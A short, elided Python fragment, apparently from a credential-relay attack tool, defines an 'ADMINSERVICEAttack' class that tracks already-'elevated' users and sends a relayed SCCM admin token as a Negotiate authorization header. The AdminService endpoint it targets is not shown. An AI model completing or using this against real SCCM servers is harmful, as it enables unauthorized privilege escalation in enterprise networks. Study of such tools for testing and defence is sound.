...
class ADMINSERVICEAttack:
    def _run(self):       
        ...
        if self.config.logonname in ELEVATED:
            LOG.info('Skipping user %s since attack was already performed' % self.config.logonname)
            return   
        ELEVATED.append(self.config.logonname) 
        ...
        token = self.config.sccmAdminToken
        headers = {'Authorization':'%s %s' % ('Negotiate', token),'Content-Type': 'application/json; odata=verbose'}
